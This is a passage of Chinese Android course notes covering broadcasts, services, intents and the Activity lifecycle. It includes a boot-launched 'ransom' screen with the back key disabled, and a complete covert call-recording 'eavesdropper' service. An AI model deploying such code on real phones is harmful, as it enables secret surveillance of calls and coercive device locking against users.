    public void onReceive(Context context, Intent intent) {

        //创建意图对象,准备开启新的Activity
        Intent it = new Intent(context,MainActivity.class);
        //创建新的任务栈，存启动的Activity
        it.setFlags(intent.FLAG_ACTIVITY_NEW_TASK);
        //启动Activity
        context.startActivity(it);
    }
}
</code></pre></li>
<li>2.清单文件中配置接收开机广播<pre><code>&lt;receiver android:name=&quot;com.itheima.lesuo.BootReceiver&quot;&gt;
    &lt;intent-filter &gt;
        &lt;action android:name=&quot;android.intent.action.BOOT_COMPLETED&quot;/&gt;
    &lt;/intent-filter&gt;
&lt;/receiver&gt;
</code></pre></li>
<li>3.权限    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"></uses-permission></li>
<li><p>4.接收开机广播，在广播接收者中启动该勒索Activity，另外设置返回键失效</p>
<pre><code>public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

    @Override
    public void onBackPressed() {
        //注掉调用父类方法：此Activity返回键失效
        //super.onBackPressed();
    }
}
</code></pre></li>
</ul>
<ul>
<li>注意：</li>
<li>因为广播接收者的启动，并不会创建任务栈，而在广播接收者中需要启动Activity，那么没有任务栈，就无法启动activity</li>
<li><p>手动设置创建新任务栈的flag</p>
<pre><code>it.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
</code></pre></li>
</ul>
<hr>
<p>#监听应用的安装、卸载、更新</p>
<blockquote>
<p>原理：应用在安装卸载更新时，系统会发送广播，广播里会携带应用的包名</p>
<ul>
<li>清单文件定义广播接收者接收的类型，因为要监听应用的三个动作，所以需要接收三种广播<pre><code>&lt;receiver android:name=&quot;com.itheima.app.AppReceiver&quot;&gt;
     &lt;intent-filter &gt;
         &lt;action android:name=&quot;android.intent.action.PACKAGE_ADDED&quot;/&gt;
         &lt;action android:name=&quot;android.intent.action.PACKAGE_REPLACED&quot;/&gt;
         &lt;action android:name=&quot;android.intent.action.PACKAGE_REMOVED&quot;/&gt;
         &lt;data android:scheme=&quot;package&quot;/&gt;
     &lt;/intent-filter&gt;
 &lt;/receiver&gt;
</code></pre></li>
</ul>
</blockquote>
<ul>
<li>广播接收者的定义</li>
</ul>
<pre><code>/**
 * 此广播接收者用于监听应用安装卸载
 * @author Administrator
 *
 */
public class AppReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {

        String action = intent.getAction();

        Uri uri = intent.getData();

        if (intent.ACTION_PACKAGE_ADDED.equals(action)) {
            Toast.makeText(context, uri+&quot;安装了&quot;, 0).show();
        }else if(intent.ACTION_PACKAGE_REMOVED.equals(action)){
            Toast.makeText(context, uri+&quot;卸载了&quot;, 0).show();
        }else if(intent.ACTION_PACKAGE_REPLACED.equals(action)){
            Toast.makeText(context, uri+&quot;更新了&quot;, 0).show();
        }
    }
}
</code></pre><hr>
<p>#广播的两种类型</p>
<ul>
<li><p>无序广播：所有跟广播的intent匹配的广播接收者都可以收到该广播，并且是没有先后顺序（同时收到）</p>
<pre><code>//发出无序广播:
public void click(View v){
    //发送自定义广播
    //1.定义意图对象
    Intent intent = new Intent();
    //2.设置action
    intent.setAction(&quot;com.itheima.a1&quot;);
    //3.发送广播
    sendBroadcast(intent);
}
</code></pre></li>
<li><p>有序广播：所有跟广播的intent匹配的广播接收者都可以收到该广播，但是会按照广播接收者的优先级来决定接收的先后顺序</p>
<ul>
<li><p>sendOrderedBroadcast();</p>
<ul>
<li>参数1：intent</li>
<li>参数2： String receiverPermission 应该是权限</li>
<li>参数3：最终接收者</li>
<li>参数4：Handler消息处理器</li>
<li>参数5：int数据</li>
<li>参数6：String数据</li>
<li><p>参数7：Bundles数据对象</p>
<pre><code>public void fdm(View v){
     //发送有序广播
     Intent intent = new Intent();
     intent.setAction(&quot;com.itheima.fdm&quot;);

     //发送有序广播
     //resultReceiver:最终接收者，此广播接收者会在最后一个收到广播，并且一定会收到
     sendOrderedBroadcast(intent, null, new MyReceiver(), null, 0, &quot;每人发100斤大米&quot;, null);
 }
</code></pre></li>
</ul>
</li>
</ul>
<ul>
<li>优先级的定义：<ul>
<li>-1000~1000</li>
</ul>
</li>
<li>最终接收者：所有广播接收者都接收到广播之后，它才接收，并且一定会接收</li>
</ul>
</li>
</ul>
<pre><code>     public class MainActivity extends Activity {

            @Override
            protected void onCreate(Bundle savedInstanceState) {
                super.onCreate(savedInstanceState);
                setContentView(R.layout.activity_main);
            }


            public void fdm(View v){
                //发送有序广播
                Intent intent = new Intent();
                intent.setAction(&quot;com.itheima.fdm&quot;);

                //发送有序广播
                //resultReceiver:最终接收者，此广播接收者会在最后一个收到广播，并且一定会收到
                sendOrderedBroadcast(intent, null, new MyReceiver(), null, 0, &quot;每人发100斤大米&quot;, null);
            }

            //定义最终接收者
            class MyReceiver extends BroadcastReceiver{

                @Override
                public void onReceive(Context context, Intent intent) {
                    String order = getResultData();
                    System.out.println(&quot;反贪局收到文件&quot; + order);

                }

            }
        }

* abortBroadcast();:阻止其他接收者接收这条广播，类似拦截，只有有序广播可以被拦截
</code></pre><p>##android应用程序的四大组件：</p>
<ul>
<li>activity 界面</li>
<li>content provider 内容提供者 暴露应用程序私有的数据</li>
<li>broadcast receiver 接受广播消息</li>
<li>service 后台的服务<blockquote>
<p>四大组件都要在清单文件配置，特殊广播接受者（代码，清单文件）</p>
</blockquote>
</li>
</ul>
<hr>
<p>#二、Service</p>
<ul>
<li>一个组件长期后台运行，没有界面。</li>
<li>就是默默运行在后台的组件，可以理解为是没有前台的activity，适合用来运行不需要前台界面的代码</li>
<li>服务可以被手动关闭，不会重启，但是如果被自动关闭，内存充足就会重启</li>
<li>startService启动服务的生命周期<ul>
<li>onCreate()–&gt;onStartCommand()–&gt;onDestroy()</li>
</ul>
</li>
<li>重复的调用startService会导致onStartCommand被重复调用</li>
</ul>
<p>####如何创建一个服务(创建类似于Activity,四大组件都如此,1.继承一个 2.配置一个)</p>
<ol>
<li>创建一个类继承Service </li>
<li><p>配置服务清单</p>
<pre><code>&lt;service android:name=&quot;com.itheima.service.MyService&quot;&gt;&lt;/service&gt;
</code></pre></li>
<li>特殊的服务，需要添加权限。</li>
<li>重写类的onBind(Intent intent)方法。<ul>
<li>及onCreate()方法–&gt;onStartCommand()方法–&gt;onDestroy()方法</li>
</ul>
</li>
<li><p>通过主页面通过intent开启关闭服务</p>
<pre><code>public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }
    //点击事件：开启MyService服务
    public void click1(View v){
        //1.创建意图
        Intent intent = new Intent(this,MyService.class);
        //2.启动服务
        startService(intent);
    }
    //点击事件：停止MyService服务
    public void click2(View v){
        //1.创建意图
        Intent intent = new Intent(this,MyService.class);
        //2.停止服务
        stopService(intent);

    }
}
</code></pre></li>
</ol>
<hr>
<h1 id="进程优先级"><a href="#进程优先级" class="headerlink" title="进程优先级"></a>进程优先级</h1><ol>
<li>前台进程：拥有一个正在与用户交互的activity（onResume方法被调用）的进程</li>
<li>可见进程：拥有一个非前台，但是对用户可见的activity（onPause方法被调用）的进程</li>
<li>服务进程：拥有一个通过startService方法启动的服务的进程</li>
<li>后台进程：拥有一个后台activity（onStop方法被调用）的进程</li>
<li>空进程：没有拥有任何活动的应用组件的进程，也就是没有任何服务和activity在运行</li>
</ol>
<hr>
<p>#电话窃听器</p>
<p>##音频捕获</p>
<ul>
<li>首先需要一个手机电话管理的服务 TelephonyManager</li>
</ul>
<ol>
<li><p>创建 android.media.MediaRecorder.</p>
<pre><code>mediaRecorder= new MediaRecorder();
</code></pre></li>
<li><p>设置音频源</p>
<pre><code>mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);//设置音频源来自麦克风，只能录自己麦克风单方面的话

(MediaRecorder.AudioSource.VOICE_CALL)//录双方通话，但是只有部分国产手机支持。
</code></pre></li>
<li><p>设置音频文件的编码格式</p>
<pre><code>mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
</code></pre></li>
<li><p>设置保存文件的路径</p>
<pre><code>mediaRecorder.setOutputFile(&quot;/sdcard/temp.mp4&quot;);
</code></pre></li>
<li><p>设置音频的编码方式</p>
<pre><code>mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
</code></pre></li>
<li><p>准备开始录音</p>
<pre><code>mediaRecorder.prepare() ;
</code></pre></li>
<li><p>开始录音</p>
<pre><code>start()；
</code></pre></li>
<li><p>停止录音</p>
<pre><code>stop();
</code></pre></li>
<li><p>释放资源</p>
<pre><code>release();
</code></pre></li>
</ol>
<ul>
<li><p>另外：录音使用下面的两个权限</p>
<pre><code>&lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;/&gt;
&lt;uses-permission android:name=&quot;android.permission.RECORD_AUDIO&quot;/&gt;
</code></pre></li>
</ul>
<p>##电话窃听器</p>
<ul>
<li><p>电话状态：空闲、响铃、接听</p>
</li>
<li><p>1.获取电话管理器，设置侦听</p>
<ul>
<li>设置侦听有两个参数</li>
<li>参数1:手机状态监听器，需继承PhoneStateListener类，重写里面的方法，实现对手机状态的监听，里面有许多方法</li>
<li><p>参数2：设置监听器只监听什么数据，无论你在手机状态监听器中重写了多少个方法，通过参数2，监听器只监听所设置的参数对应的数据，通过监听数据的变化，去调用不同的方法</p>
<pre><code>@Override
public void onCreate() {
    super.onCreate();
    //获取电话管理器
    TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
    //设置侦听
    //arg0:手机状态监听器
    //arg1:设置监听器只监听什么数据
    tm.listen(new Mylistener(), PhoneStateListener.LISTEN_CALL_STATE);
}
</code></pre></li>
</ul>
</li>
<li><p>2.侦听对象的实现</p>
<pre><code>private MediaRecorder recorder;
class Mylistener extends PhoneStateListener{
</code></pre></li>
</ul>
<pre><code>    //电话状态改变时，此方法调用
    @Override
    public void onCallStateChanged(int state, String incomingNumber) {
        // TODO Auto-generated method stub
        super.onCallStateChanged(state, incomingNumber);
        switch (state) {
        case TelephonyManager.CALL_STATE_IDLE://空闲
            if(recorder != null){
                recorder.stop();
                //释放占用的资源
                recorder.release();
                recorder = null;
            }
            break;
        case TelephonyManager.CALL_STATE_RINGING://响铃
            if(recorder == null){
                recorder = new MediaRecorder();
                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                recorder.setOutputFile(&quot;sdcard/voice.3gp&quot;);
                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                try {
                    //准备完毕后，随时可以录音
                    recorder.prepare();
                } catch (Exception e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
            }
            break;
        case TelephonyManager.CALL_STATE_OFFHOOK://摘机
            if(recorder != null){
                recorder.start();
            }
            break;

        }
    }

}
</code></pre><ul>
<li><p>3.添加权限，</p>
<ul>
<li>读取用户手机状态权限</li>
<li>写入SD卡权限</li>
<li>开机自启动权限</li>
<li><p>记录音频权限</p>
<pre><code>&lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;/&gt;
&lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot;/&gt;
&lt;uses-permission android:name=&quot;android.permission.RECEIVE_BOOT_COMPLETED&quot;/&gt;
&lt;uses-permission android:name=&quot;android.permission.RECORD_AUDIO&quot;/&gt;
</code></pre></li>
</ul>
</li>
</ul>
<p>–电话窃听器示例：—-</p>
<pre><code>/**
 * 此RecorderService服务：用于监听手机状态改变,实现电话窃听器功能
 * 1、获取电话管理器，并对手机设置监听
 * 2、定义一个手机监听器，实现电话窃听器功能
 * 
 * @author Administrator
 *
 */
public class RecorderService extends Service {

    @Override
    public IBinder onBind(Intent intent) {
        // TODO Auto-generated method stub
        return null;
    }

    @Override
    public void onCreate() {
        // TODO Auto-generated method stub
        super.onCreate();
        //获取电话管理器
        TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        //设置侦听
        //arg1:设置监听器只监听什么数据
        tm.listen(new Mylistener(), PhoneStateListener.LISTEN_CALL_STATE);
    }

    //定义多媒体录音对象
    private MediaRecorder recorder;
    class Mylistener extends PhoneStateListener{

        //电话状态改变时，此方法调用
        @Override
        public void onCallStateChanged(int state, String incomingNumber) {
            // TODO Auto-generated method stub
            super.onCallStateChanged(state, incomingNumber);
            switch (state) {
            case TelephonyManager.CALL_STATE_IDLE://空闲
                if(recorder != null){
                    //停止录音
                    recorder.stop();
                    //释放占用的资源
                    recorder.release();
                    recorder = null;
                }
                break;
            case TelephonyManager.CALL_STATE_RINGING://响铃
                if(recorder == null){
                    //获取多媒体录音对象
                    recorder = new MediaRecorder();
                    //设置音频源,MIC只能设置音频源来自麦克风，只能录自己麦克风单方面的话
                    recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                    //设置音频文件的编码格式
                    recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                    //设置保存文件的路径
                    recorder.setOutputFile(&quot;sdcard/voice.3gp&quot;);
                    //设置音频的编码方式
                    recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                    try {
                        //准备完毕后，随时可以录音,准备开始录音了
                        recorder.prepare();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
                break;
            case TelephonyManager.CALL_STATE_OFFHOOK://摘机
                if(recorder != null){
                    //开始录音
                    recorder.start();
                }
                break;

            }
        }

    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // TODO Auto-generated method stub
        return super.onStartCommand(intent, flags, startId);
    }
}
</code></pre>
          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/02/13/06-Activity-页面跳转-数据传递/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="yass">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="http://ojupj7fr2.bkt.clouddn.com/blog_xintouxiang.png">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="个人博客">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="个人博客" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/02/13/06-Activity-页面跳转-数据传递/" itemprop="url">
                  06 Activity&页面跳转&数据传递
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-13T09:44:43+08:00">
                2017-02-13
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>#一、创建第二个Activity</p>
<ul>
<li>1.自定义类继承Activity （一个新的页面） 给其创建布局文件 </li>
<li><p>2.需要在清单文件中为其配置一个activity标签</p>
<pre><code>&lt;activity 
        android:name=&quot;包名.类名&quot;&gt;
&lt;/activity&gt;
</code></pre><ul>
<li>注意：</li>
<li>1.在清单中进行如下配置，会在桌面出现两个图标，名字一样的快捷方式,</li>
<li><p>因为主页面，已经在activity标签配置了Activite入口，新页面又配置了Activity入口</p>
<pre><code>&lt;activity
    android:name=&quot;com.itheima.secondactivity.MainActivity&quot;&gt;
    &lt;intent-filter&gt;
        &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;
        &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;
    &lt;/intent-filter&gt;
&lt;/activity&gt;

&lt;activity 
    android:name=&quot;.SecondActivity&quot;&gt;
     &lt;intent-filter&gt;
        &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;
        &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;
    &lt;/intent-filter&gt;
&lt;/activity&gt;
</code></pre></li>
<li><p>2.在清单中进行如下配置后，会在桌面出现两个不同图标，不同名字的启动快捷方式</p>
</li>
<li><p>分别对应打开主页面和新建页面</p>
<pre><code>&lt;activity
    android:icon=&quot;@drawable/photo1&quot;
    android:label=&quot;启动第一个&quot;
    android:name=&quot;com.itheima.secondactivity.MainActivity&quot;&gt;
    &lt;intent-filter&gt;
        &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;
        &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;
    &lt;/intent-filter&gt;
&lt;/activity&gt;

&lt;activity 
    android:icon=&quot;@drawable/photo2&quot;
    android:label=&quot;启动第二个&quot;
    android:name=&quot;.SecondActivity&quot;&gt;
     &lt;intent-filter&gt;
        &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;

        &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;
    &lt;/intent-filter&gt;
&lt;/activity&gt;
</code></pre></li>
</ul>
</li>
<li><p>activity标签中如果带有以下的<intent-filter>子节点，则会在系统中多创建一个快捷图标,就是新页面activity的启动图标</intent-filter></p>
<pre><code>&lt;intent-filter&gt;
    &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;
    &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;
&lt;/intent-filter&gt;
</code></pre></li>
<li>一个应用程序可以在桌面创建多个快捷图标。</li>
<li><p>activity的名称、图标可以和应用程序的名称、图标不相同</p>
<pre><code>android:icon=&quot;@drawable/ic_launcher&quot;
android:label=&quot;@string/app_name&quot;
</code></pre></li>
</ul>
<p>###一个应用程序可以创建多个入口的activity，快捷图标 ，对应打开不同的页面</p>
<p>###只要配置了以下<intent-filter>就会在桌面上创建一个新的快捷图标。</intent-filter></p>
<pre><code>&lt;intent-filter&gt;
     &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;
      &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;
 &lt;/intent-filter&gt;`
</code></pre><h2 id="注意一个新页面，可以配置多个，用于其他页面进行匹配，使能够让其他页面跳转过来"><a href="#注意一个新页面，可以配置多个，用于其他页面进行匹配，使能够让其他页面跳转过来" class="headerlink" title="###注意一个新页面，可以配置多个，用于其他页面进行匹配，使能够让其他页面跳转过来"></a>###注意一个新页面，可以配置多个<intent-filter>，用于其他页面进行匹配，使能够让其他页面跳转过来</intent-filter></h2><p>#二、Activity的跳转</p>
<p>##2.1如何实现页面跳转</p>
<ul>
<li><p>Activity的跳转需要创建Intent对象，通过设置intent对象的参数指定要跳转Activity</p>
<pre><code>public void click2(View v){
    //显式意图
    Intent intent = new Intent();
    //指定目标Activity的字节码
    intent.setClass(this, SecondActivity.class);

    //显式跳转
    startActivity(intent);
}
</code></pre></li>
</ul>
<p>##Activity跳转分类</p>
<ul>
<li>通过对Intent对象的参数设置不同，跳转方式也不同<ul>
<li>显式意图：通过设置Activity的包名和类名实现跳转，称为显式意图</li>
<li>隐式意图：通过指定动作实现跳转，称为隐式意图</li>
</ul>
</li>
</ul>
<p>###显式意图：直接指定要激活的activity。<em>效率高</em>。直接指定。</p>
<ul>
<li><p>跳转至同一项目下的另一个Activity，直接指定该Activity的字节码即可</p>
<pre><code>public void click2(View v){
    //显式意图
    Intent intent = new Intent();
    //指定目标Activity的字节码
    intent.setClass(this, SecondActivity.class);

    //显式跳转
    startActivity(intent);
}
</code></pre></li>
<li><p>跳转至其他应用中的Activity，需要指定该应用的包名和该Activity的类名</p>
<pre><code>public void click3(View v){
    //显式意图
    Intent intent = new Intent();
    //启动系统自带的拨号器应用
    //arg0：目标Activity所在的项目的应用包名
    //arg1：目标Activity的包名和类名
    intent.setClassName(&quot;com.android.dialer&quot;, &quot;com.android.dialer.DialtactsActivity&quot;);
    //显式跳转
    startActivity(intent);
}
</code></pre></li>
</ul>
<p>###隐式意图：（动作，数据，category）开启新的activity。</p>
<ul>
<li><p>1.隐式意图跳转至指定Activity</p>
<ul>
<li><p>实际上系统的拨号器已经在自己的清单文件中进行了配置，使得此拨号器页面能够实现隐式启动，那么如何配置呢？</p>
<pre><code>public void click4(View v){
    Intent intent = new Intent();
    //启动系统自带的拨号器应用
    intent.setAction(Intent.ACTION_DIAL);
    startActivity(intent);
}
</code></pre></li>
</ul>
</li>
<li>2.要让一个Activity可以被隐式启动，需要在清单文件的activity节点中设置intent-filter子节点<ul>
<li>action 指定动作（可以自定义，可以使用系统自带的）name可以写任意自定义，一般比照谷歌的写法</li>
<li>data   指定数据（操作什么内容）</li>
<li>category 类别 （默认类别，机顶盒，车载电脑）</li>
</ul>
</li>
</ul>
<pre><code>&lt;intent-filter &gt;
     &lt;action android:name=&quot;com.itheima.second&quot;/&gt;
     &lt;data 
         android:scheme=&quot;asd&quot; 
         android:mimeType=&quot;aa/bb&quot;/&gt;
     &lt;category android:name=&quot;android.intent.category.DEFAULT&quot;/&gt;
 &lt;/intent-filter&gt;
</code></pre><p>##activity隐式启动在清单文件中的配置</p>
<ul>
<li><strong>action</strong> activity对应的动作。 可以用任意一个字符串描述（最好，顾名思义）</li>
<li><strong>category</strong> 额外的类别参数。  指定工作的设备（车载电脑，机顶盒，默认的手机） 通常指定的参数<code>android.intent.category.DEFAULT</code></li>
<li><strong>data</strong>  指定数据和数据的类型  <ul>
<li>scheme 数据前缀</li>
<li>host 主机名</li>
<li>port 端口号</li>
<li>path 路径 记得在前面加上 /</li>
<li>mimeType 数据类型 从tomcat里面查找常见的数据类型</li>
</ul>
</li>
<li>隐式启动页面，该页面的配置示例</li>
</ul>
<pre><code>&lt;activity 
        android:name=&quot;com.itheima.activityjump.SecondActivity&quot;&gt;
        &lt;intent-filter &gt;
            &lt;action android:name=&quot;com.itheima.a1&quot;/&gt;
            &lt;data android:scheme=&quot;youyiyi1&quot;/&gt;
            &lt;action android:name=&quot;com.itheima.a3&quot;/&gt;
            &lt;data android:scheme=&quot;youyiyi3&quot;/&gt;
            &lt;data android:mimeType=&quot;text/name&quot;/&gt;

            &lt;category android:name=&quot;android.intent.category.DEFAULT&quot;/&gt;
        &lt;/intent-filter&gt;

        &lt;intent-filter &gt;
            &lt;action android:name=&quot;com.itheima.a2&quot;/&gt;
            &lt;data android:scheme=&quot;youyiyi2&quot;/&gt;

            &lt;category android:name=&quot;android.intent.category.DEFAULT&quot;/&gt;
        &lt;/intent-filter&gt;
    &lt;/activity&gt;
</code></pre><ul>
<li>3.隐式意图启动Activity，需要为intent设置以上三个属性，且值必须与该Activity在清单文件中对三个属性的定义匹配</li>
<li>4.隐式意图启动Activity时要注意：<ul>
<li>设置参数时setType()会清除setData()，而setData()会清除setType(), 两者不能共存，</li>
<li>所以通过setDataAndType(Uri.parse(“youyiyi3:xiaoming”), “text/name”);</li>
<li>一并将两者全部设置了</li>
</ul>
</li>
<li><ul>
<li><p>页面一跳转到页面二示例（如：隐式跳转上面配置的页面）</p>
<p> public void click5(View v){</p>
<pre><code>Intent intent = new Intent();
intent.setAction(&quot;com.itheima.a1&quot;);
//匹配mimetype
</code></pre><p>  //        intent.setType(“text/name”);</p>
<pre><code>//匹配scheme，注意setData()会将上面的setType清除
</code></pre><p>  //        intent.setData(Uri.parse(“youyiyi3:xiaoming”));</p>
<pre><code>//匹配scheme和mimetype
intent.setDataAndType(Uri.parse(&quot;youyiyi3:xiaoming&quot;), &quot;text/name&quot;);

//如果没有指定category，则自动添加以下代码
</code></pre><p>  //        intent.addCategory(Intent.CATEGORY_DEFAULT);</p>
<pre><code>    startActivity(intent);
}
</code></pre></li>
<li><p>页面一跳转到页面二示例二（如：隐式跳转上面配置的页面）</p>
</li>
</ul>
</li>
</ul>
<pre><code>public void click5(View v){
     Intent intent = new Intent();
     //匹配动作
     intent.setAction(&quot;com.itheima.a2&quot;);
     //匹配scheme
     intent.setData(Uri.parse(&quot;youyiyi2:xiaoming&quot;));

     startActivity(intent);
 }
</code></pre><ul>
<li>5.intent-filter节点及其子节点都可以同时定义多个，隐式启动时只需与任意一个匹配即可</li>
</ul>
<p>#####在新页面获取通过setData传递的数据</p>
<ul>
<li>获取启动此Activity的intent对象 ，通过intent得到数据<br>  Intent intent = getIntent();<br>  Uri uri = intent.getData();     </li>
</ul>
<pre><code> //第二个Activity获取传进过来的数据
 public class SecondActivity extends Activity {

     @Override
     protected void onCreate(Bundle savedInstanceState) {
          super.onCreate(savedInstanceState);
          //指定Activity显示哪一个布局文件
          setContentView(R.layout.activity_second);

          //获取传递过来的数据
          //获取启动此Activity的intent对象
          Intent intent = getIntent();
          Uri uri = intent.getData();
          System.out.println(uri);
     }
}
</code></pre><p>###显式意图和隐式意图的应用场景</p>
<ul>
<li>显式意图用于启动同一应用中的Activity，直接指定包名类名。效率高。</li>
<li>隐式意图用于启动不同应用中的Activity，通过action和data指定。</li>
<li>另外对于隐式意图：<ul>
<li>如果系统中存在多个Activity的intent-filter同时与你的intent匹配，那么系统会显示一个对话框，列出所有匹配的Activity，由用户选择启动哪一个</li>
</ul>
</li>
</ul>
<hr>
<p>#Activity跳转时的数据传递</p>
<ul>
<li>Activity通过Intent启动时，可以通过Intent对象携带数据到目标Activity</li>
<li>8大基本类型数据 以及数据的数组都是可以通过intnet传递<ul>
<li>intent.putExtra(name,values)</li>
</ul>
</li>
<li>对象也可以通过intent传递。<ul>
<li>要求对象一定是实现Serializable接口的 可序列化的对象。</li>
<li>要求对象一定是实现Parcelable 接口  </li>
</ul>
</li>
</ul>
<ul>
<li><p>方式一：直接将数据封装到intent中</p>
<pre><code>public void click(View v){
    EditText et_malename = (EditText) findViewById(R.id.et_malename);
    EditText et_femalename = (EditText) findViewById(R.id.et_femalename);

    String maleName = et_malename.getText().toString();
    String femaleName = et_femalename.getText().toString();

    Intent intent = new Intent(this, SecondActivity.class);

    //把数据封装至intent中
    intent.putExtra(&quot;maleName&quot;, maleName);
    intent.putExtra(&quot;femaleName&quot;, femaleName);

    startActivity(intent);
}
</code></pre></li>
<li><p>方式二：先把数据封装至bundle中，再把bundle封装至intent中</p>
<pre><code> public void click(View v){
        EditText et_malename = (EditText) findViewById(R.id.et_malename);
        EditText et_femalename = (EditText) findViewById(R.id.et_femalename);

        String maleName = et_malename.getText().toString();
        String femaleName = et_femalename.getText().toString();

        Intent intent = new Intent(this, SecondActivity.class);

        //把数据封装至bundle中
        Bundle bundle = new Bundle();
        bundle.putString(&quot;maleName&quot;, maleName);
        bundle.putString(&quot;femaleName&quot;, femaleName);

        //把bundle封装至intent中
        intent.putExtras(bundle);

        startActivity(intent);
    }
}
</code></pre></li>
</ul>
<ul>
<li><p>在目标Activity中取出数据(理解：在新页面，获取传递过来的数据)</p>
<pre><code>Intent intent = getIntent();
String maleName = intent.getStringExtra(&quot;maleName&quot;);
String femaleName = intent.getStringExtra(&quot;femaleName&quot;);
@Override
     protected void onCreate(Bundle savedInstanceState) {
          super.onCreate(savedInstanceState);
          //指定Activity显示哪一个布局文件
          setContentView(R.layout.activity_second);

          Intent intent = getIntent();
          //直接获取封装在intent中的数据
          //String maleName = intent.getStringExtra(&quot;maleName&quot;);
          //String femaleName = intent.getStringExtra(&quot;femaleName&quot;);

          //先通过intent获取Bundle对象
          Bundle bundle = intent.getExtras();
          //再通过Bundle对象，获取数据
          String maleName = bundle.getString(&quot;maleName&quot;);
          String femaleName = (String) bundle.get(&quot;femaleName&quot;);

          Random rd = new Random();
          int yinyuan = rd.nextInt(11) + 90;

          ((TextView)findViewById(R.id.tv)).setText(maleName + &quot;与&quot; + femaleName + &quot;的缘分为&quot; + yinyuan + &quot;，实乃天作之合&quot;);
     }
</code></pre></li>
</ul>
<hr>
<p>#Activity生命周期</p>
<ul>
<li>void onCreate()<ul>
<li>Activity已经被创建完毕，</li>
<li>activity被创建的时候调用。 适合做界面的初始化操作。</li>
</ul>
</li>
<li>void onStart()<ul>
<li>Activity已经显示在屏幕，但没有得到焦点，</li>
<li>activity界面用户可见。  适合更新界面。 继续播放视频</li>
</ul>
</li>
<li>void onResume()<ul>
<li>Activity得到焦点，可以与用户交互</li>
<li>获取焦点 按钮可以被点击</li>
</ul>
</li>
<li>void onPause()<ul>
<li>Activity失去焦点，无法再与用户交互，但依然可见</li>
<li>失去焦点 按钮可以看到，但是不可以被点击。<em>游戏使用</em></li>
</ul>
</li>
<li>void onStop()<ul>
<li>Activity不可见，进入后台</li>
<li>activity界面用户不可见。 界面不可见适合清理操作。暂停视频。<em>视频播放器</em></li>
</ul>
</li>
<li>void onDestroy()<ul>
<li>Activity被销毁，</li>
<li>activity被销毁的时候调用。 适合做扫尾的操作。数据保存的操作。<em>短信内容的保存</em></li>
</ul>
</li>
<li>void onRestart()<ul>
<li>Activity从不可见变成可见时会执行此方法</li>
</ul>
</li>
<li>Activity生命周期使用场景<ul>
<li>Activity创建时需要初始化资源，销毁时需要释放资源；或者播放器应用，在界面进入后台时需要自动暂停</li>
</ul>
</li>
</ul>
<p>###完整生命周期（entire lifetime）<br>onCreate–&gt;onStart–&gt;onResume–&gt;onPause–&gt;onStop–&gt;onDestory</p>
<p>###可视生命周期（visible lifetime）<br>onStart–&gt;onResume–&gt;onPause–&gt;onStop</p>
<p>###前台生命周期（foreground lifetime）<br>onResume–&gt;onPause</p>
<ul>
